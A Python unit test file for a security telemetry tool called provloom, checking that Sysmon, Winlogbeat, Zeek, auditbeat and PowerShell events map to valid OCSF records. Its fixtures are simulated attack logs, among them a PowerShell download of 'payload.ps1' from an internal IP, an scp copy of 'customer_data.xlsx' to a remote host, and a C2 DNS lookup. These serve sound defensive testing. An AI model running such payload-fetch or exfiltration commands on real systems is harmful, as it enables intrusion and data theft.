from __future__ import annotations

import json
import tempfile
import unittest
from datetime import UTC, datetime
from pathlib import Path

import pytest

from provloom.config import AppConfig
from provloom.domain.common import AccessScope, PageSpec, TimeRange
from provloom.domain.enums import EntityType, NormalizationStatus, RelationType
from provloom.query.interfaces import EntitySearchFilter, EventSearchFilter
from provloom.query.ops_interfaces import SampleImportRequest
from provloom.runtime import ProvLoomRuntime
from tests.evaluation.ocsf_validator import validate_ocsf_v140_event

SCOPE = AccessScope(tenant_id="default")
WINDOW = TimeRange(
    start_time=datetime(2020, 1, 1, 0, 0, tzinfo=UTC),
    end_time=datetime(2026, 12, 31, 0, 0, tzinfo=UTC),
)


@pytest.mark.unit
class IssueFixesParsersAndOcsfTests(unittest.TestCase):
    def _assert_all_mapped_ocsf_valid(self, rt: ProvLoomRuntime, source_id: str) -> list[int]:
        page = rt.query_service.search_events(
            SCOPE,
            WINDOW,
            EventSearchFilter(sources=(source_id,), include_fallback=True),
            PageSpec(limit=100),
        )
        self.assertGreater(len(page.items), 0)
        class_uids: list[int] = []
        for item in page.items:
            detail = rt.query_service.get_event(SCOPE, item.event_id, include_raw=True)
            assert detail is not None
            class_uids.append(detail.normalized.class_uid)
            if detail.normalized.normalization_status == NormalizationStatus.MAPPED:
                errs = validate_ocsf_v140_event(
                    detail.normalized.ocsf_payload,
                    allow_provloom_metadata_original_uid=True,
                    check_required=True,
                    check_enums=True,
                    check_constraints=True,
                )
                self.assertEqual(errs, [], f"OCSF errors on {source_id}: {errs}")
        return class_uids

    def test_sysmon_eid5_and_eid22_pass_strict_ocsf_v140(self) -> None:
        rt = ProvLoomRuntime.build(AppConfig(database_url="sqlite+pysqlite:///:memory:"))
        rt.ops_service.import_raw_content(
            tenant_scope="default",
            source_id="edr-sysmon",
            source_type="sysmon",
            adapter_type="jsonl",
            raw_text="\n".join(
                [
                    json.dumps(
                        {
                            "EventID": 5,
                            "UtcTime": "2025-01-07 18:09:22.388",
                            "Computer": "CLIENT2.breach.local",
                            "EventRecordID": "101",
                            "ProcessGuid": "{0d4c409b-0001-0001-0001-000000000001}",
                            "ProcessId": 6912,
                            "Image": "C:\\Users\\Public\\svcmon.exe",
                        }
                    ),
                    json.dumps(
                        {
                            "EventID": 22,
                            "UtcTime": "2025-01-07 18:09:25.000",
                            "Computer": "CLIENT2.breach.local",
                            "EventRecordID": "102",
                            "ProcessGuid": "{0d4c409b-0001-0001-0001-000000000001}",
                            "ProcessId": 6912,
                            "Image": "C:\\Users\\Public\\svcmon.exe",
                            "QueryName": "c2.breach.local",
                            "QueryResults": "172.19.0.2;",
                        }
                    ),
                ]
            ),
        )
        cids = self._assert_all_mapped_ocsf_valid(rt, "edr-sysmon")
        self.assertEqual(sorted(cids), [1007, 4003])

    def test_native_winlogbeat_ecs_otrf_xml_and_zeek_formats(self) -> None:
        rt = ProvLoomRuntime.build(AppConfig(database_url="sqlite+pysqlite:///:memory:"))
        # 1. Native Winlogbeat ECS Sysmon + Security 4624
        rt.ops_service.import_raw_content(
            tenant_scope="default",
            source_id="winlog-ecs",
            source_type="winlogbeat",
            adapter_type="jsonl",
            raw_text="\n".join(
                [
                    json.dumps(
                        {
                            "@timestamp": "2025-01-06T10:00:00.126Z",
                            "event": {"code": 1, "module": "sysmon"},
                            "host": {"name": "CLIENT2.breach.local"},
                            "winlog": {
                                "channel": "Microsoft-Windows-Sysmon/Operational",
                                "event_id": 1,
                                "record_id": 5001,
                                "event_data": {"User": "BREACH\\client2"},
                            },
                            "process": {
                                "entity_id": "{11111111-1111-1111-1111-111111111111}",
                                "pid": 4444,
                                "executable": "C:\\Windows\\System32\\cmd.exe",
                                "command_line": "cmd.exe /c whoami",
                                "parent": {
                                    "entity_id": "{00000000-0000-0000-0000-000000000001}",
                                    "pid": 1111,
                                    "executable": "C:\\Windows\\explorer.exe",
                                },
                            },
                        }
                    ),
                    json.dumps(
                        {
                            "@timestamp": "2025-01-06T10:01:00.000Z",
                            "event": {
                                "code": 4624,
                                "provider": "Microsoft-Windows-Security-Auditing",
                            },
                            "host": {"name": "CLIENT1.breach.local"},
                            "winlog": {
                                "channel": "Security",
                                "event_id": 4624,
                                "record_id": 9001,
                                "event_data": {
                                    "TargetUserSid": "S-1-5-21-100-200-300-1001",
                                    "TargetUserName": "client2",
                                    "TargetDomainName": "BREACH",
                                    "LogonType": "3",
                                    "IpAddress": "-",
                                    "ServiceName": "-",
                                },
                            },
                        }
                    ),
                ]
            ),
        )
        self.assertEqual(sorted(self._assert_all_mapped_ocsf_valid(rt, "winlog-ecs")), [1007, 3002])

        # 2. Unmodified OTRF Sysmon/Security/Zeek
        rt.ops_service.import_raw_content(
            tenant_scope="default",
            source_id="otrf-sysmon",
            source_type="sysmon",
            adapter_type="jsonl",
            raw_text=json.dumps(
                {
                    "EventID": 1,
                    "UtcTime": "2025-01-06 10:05:00.000",
                    "Hostname": "SCRANTON.dmevals.local",
                    "RecordNumber": 77,
                    "ProcessGuid": "{22222222-2222-2222-2222-222222222222}",
                    "ProcessId": 2222,
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "ParentProcessGuid": "-",
                    "ParentProcessId": "-",
                    "User": "-",
                }
            ),
        )
        self.assertEqual(self._assert_all_mapped_ocsf_valid(rt, "otrf-sysmon"), [1007])

        rt.ops_service.import_raw_content(
            tenant_scope="default",
            source_id="otrf-sec",
            source_type="win_security",
            adapter_type="jsonl",
            raw_text=json.dumps(
                {
                    "EventID": 4624,
                    "@timestamp": "2025-01-06T10:06:00Z",
                    "Hostname": "NASHUA.dmevals.local",
                    "RecordNumber": 88,
                    "TargetUserName": "pbeesly",
                    "TargetDomainName": "DMEVALS",
                    "LogonType": 3,
                    "IpAddress": "-",
                    "ServiceName": "-",
                }
            ),
        )
        self.assertEqual(self._assert_all_mapped_ocsf_valid(rt, "otrf-sec"), [3002])

        rt.ops_service.import_raw_content(
            tenant_scope="default",
            source_id="otrf-zeek",
            source_type="zeek",
            adapter_type="jsonl",
            raw_text=json.dumps(
                {
                    "ts": "2025-01-06T10:07:00Z",
                    "uid": "Czeek1",
                    "@stream": "conn",
                    "id_orig_h": "172.16.1.3",
                    "id_orig_p": 50123,
                    "id_resp_h": "172.16.1.2",
                    "id_resp_p": 445,
                    "proto": "tcp",
                }
            ),
        )
        self.assertEqual(self._assert_all_mapped_ocsf_valid(rt, "otrf-zeek"), [4001])

        # 3. XmlWinEventLog
        xml_event = (
            '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
            "<System>"
            '<Provider Name="Microsoft-Windows-Sysmon"/>'
            "<EventID>1</EventID>"
            '<TimeCreated SystemTime="2025-01-06T10:08:00.000Z"/>'
            "<EventRecordID>301</EventRecordID>"
            "<Channel>Microsoft-Windows-Sysmon/Operational</Channel>"
            "<Computer>CLIENT3.breach.local</Computer>"
            "</System>"
            "<EventData>"
            '<Data Name="ProcessGuid">{33333333-3333-3333-3333-333333333333}</Data>'
            '<Data Name="ProcessId">3333</Data>'
            '<Data Name="Image">C:\\Windows\\System32\\whoami.exe</Data>'
            '<Data Name="CommandLine">whoami /all</Data>'
            "</EventData>"
            "</Event>"
        )
        with tempfile.TemporaryDirectory() as td:
            xml_path = Path(td) / "events.xml"
            xml_path.write_text(xml_event, encoding="utf-8")
            rt.ops_service.submit_import(
                SampleImportRequest(
                    tenant_scope="default",
                    source_id="win-xml",
                    source_type="xmlwineventlog",
                    adapter_type="xml",
                    source_uri=str(xml_path),
                )
            )
        self.assertEqual(self._assert_all_mapped_ocsf_valid(rt, "win-xml"), [1007])

        # 4. Native Zeek TSV adapter + malformed row lands in pipeline_failures
        zeek_tsv = "\n".join(
            [
                "#separator \\x09",
                "#set_separator\t,",
                "#empty_field\t(empty)",
                "#unset_field\t-",
                "#path\tconn",
                "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\torig_bytes\tresp_bytes",
                "1736121609.539555\tC2aY1C1\t172.16.1.3\t52000\t172.16.1.2\t445\ttcp\t120\t450",
                "1736121610.000000\tBadRow\t172.16.1.3",
            ]
        )
        with tempfile.TemporaryDirectory() as td:
            tsv_path = Path(td) / "conn.log"
            tsv_path.write_text(zeek_tsv, encoding="utf-8")
            rt.ops_service.submit_import(
                SampleImportRequest(
                    tenant_scope="default",
                    source_id="zeek-tsv",
                    source_type="zeek_tsv",
                    adapter_type="zeek_tsv",
                    source_uri=str(tsv_path),
                )
            )
        self.assertEqual(self._assert_all_mapped_ocsf_valid(rt, "zeek-tsv"), [4001])
        failures = rt.ops_service.list_failures(SCOPE, None, None, PageSpec(limit=20)).items
        self.assertEqual(len(failures), 1)

    def test_auditbeat_and_powershell_map_ocsf_and_extract_relations(self) -> None:
        rt = ProvLoomRuntime.build(AppConfig(database_url="sqlite+pysqlite:///:memory:"))
        rt.ops_service.import_raw_content(
            tenant_scope="default",
            source_id="linux-audit",
            source_type="auditbeat",
            adapter_type="jsonl",
            raw_text="\n".join(
                [
                    json.dumps(
                        {
                            "@timestamp": "2025-01-10T11:34:10.000Z",
                            "host": {"name": "internalserver", "id": "host-int-01"},
                            "auditd": {
                                "sequence": 1001,
                                "message_type": "syscall",
                                "data": {"syscall": "execve"},
                            },
                            "process": {
                                "pid": 26186,
                                "ppid": 694,
                                "executable": "/usr/bin/scp",
                                "name": "scp",
                                "title": "scp customer_data.xlsx root@172.16.1.2:/tmp/",
                            },
                            "user": {"name": "root", "id": "0"},
                        }
                    ),
                    json.dumps(
                        {
                            "@timestamp": "2025-01-10T11:34:11.000Z",
                            "host": {"name": "internalserver", "id": "host-int-01"},
                            "auditd": {
                                "sequence": 1002,
                                "message_type": "syscall",
                                "data": {"syscall": "open", "a1": "241"},
                                "paths": [{"name": "/tmp/archive.tar.gz", "nametype": "CREATE"}],
                            },
                            "process": {"pid": 26186, "executable": "/usr/bin/scp"},
                            "user": {"name": "root", "id": "0"},
                        }
                    ),
                    json.dumps(
                        {
                            "@timestamp": "2025-01-10T11:34:12.000Z",
                            "host": {"name": "internalserver", "id": "host-int-01"},
                            "auditd": {
                                "sequence": 1003,
                                "message_type": "syscall",
                                "data": {"syscall": "connect"},
                            },
                            "destination": {"ip": "172.16.1.2", "port": 22},
                            "process": {"pid": 26186, "executable": "/usr/bin/scp"},
                            "user": {"name": "root", "id": "0"},
                        }
                    ),
                    json.dumps(
                        {
                            "@timestamp": "2025-01-10T11:34:09.000Z",
                            "host": {"name": "internalserver", "id": "host-int-01"},
                            "auditd": {"sequence": 1000, "message_type": "user_acct"},
                            "event": {"action": "was-authorized"},
                            "user": {"name": "breachadmin", "id": "1000"},
                            "service": {"name": "sshd"},
                        }
                    ),
                ]
            ),
        )
        audit_cids = self._assert_all_mapped_ocsf_valid(rt, "linux-audit")
        self.assertEqual(sorted(audit_cids), [1001, 1007, 3002, 4001])

        procs = rt.query_service.search_entities(
            SCOPE,
            WINDOW,
            EntitySearchFilter(entity_types=(EntityType.PROCESS,)),
            PageSpec(limit=10),
        ).items
        scp_proc = next(p for p in procs if "scp" in p.display_label)
        rel_types = {
            r.relation_type
            for r in rt.query_service.get_entity_relations(SCOPE, scp_proc.entity_id, WINDOW).items
        }
        self.assertTrue(
            {
                RelationType.RUNS,
                RelationType.SPAWNS,
                RelationType.WRITES,
                RelationType.CONNECTS_TO,
            }.issubset(rel_types)
        )

        # PowerShell (Winlogbeat ECS 4104 + OTRF 800)
        rt.ops_service.import_raw_content(
            tenant_scope="default",
            source_id="win-ps",
            source_type="powershell",
            adapter_type="jsonl",
            raw_text="\n".join(
                [
                    json.dumps(
                        {
                            "@timestamp": "2025-01-06T10:02:30.192Z",
                            "event": {"code": 4104, "module": "powershell"},
                            "host": {"name": "CLIENT2.breach.local"},
                            "winlog": {
                                "channel": "Microsoft-Windows-PowerShell/Operational",
                                "event_id": 4104,
                                "record_id": 8801,
                                "event_data": {
                                    "ScriptBlockId": "sb-001",
                                    "ScriptBlockText": "Invoke-WebRequest http://172.19.0.2/payload.ps1",
                                    "Path": "C:\\Users\\Public\\payload.ps1",
                                },
                            },
                        }
                    ),
                    json.dumps(
                        {
                            "EventTime": "2020-05-01 23:08:24",
                            "EventID": 800,
                            "ExecutionProcessID": 0,
                            "RecordNumber": 10987,
                            "host": "SCRANTON.dmevals.local",
                            "Domain": "DMEVALS",
                            "AccountName": "pbeesly",
                            "Message": "Pipeline Execution Details",
                        }
                    ),
                ]
            ),
        )
        ps_cids = self._assert_all_mapped_ocsf_valid(rt, "win-ps")
        self.assertEqual(ps_cids, [1009, 1009])
